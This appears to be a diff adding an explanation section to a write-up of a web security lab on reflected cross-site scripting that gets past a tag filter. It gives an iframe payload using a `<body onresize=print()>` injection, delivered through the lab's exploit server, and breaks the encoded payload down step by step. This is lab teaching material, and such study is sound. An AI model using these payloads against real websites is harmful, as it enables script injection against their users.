@@ -16,3 +16,14 @@
 - When the attack is finished, review the results. Note that many paylaods caused `400` response while some of them caused `200` response including `onresize` payload.
 - Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
 - Click Store and Deliver exploit to victim.
+
+### Explanation
+
+-  Inside the src URL (payload): `?search=%22%3E%3Cbody%20onresize=print()%3E`
+-  When URL-decoded, it becomes: `?search="><body onresize=print()>`
+-  So, the full iframe src becomes: `https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>`
+-  `?search=">` → Closes any open attribute or string and breaks out into HTML context.
+-  `<body onresize=print()>` → Injects a new `<body>` tag with an event handler.
+-  `onresize=print()` → Calls `print()` when the body is resized (a browser built-in JS function that opens the print dialog).
+-  Back to the iframe tag: `onload=this.style.width='100px'`
+-  Once the iframe loads, this JS executes and changes the iframe's width to `100px`, likely to hide it visually.
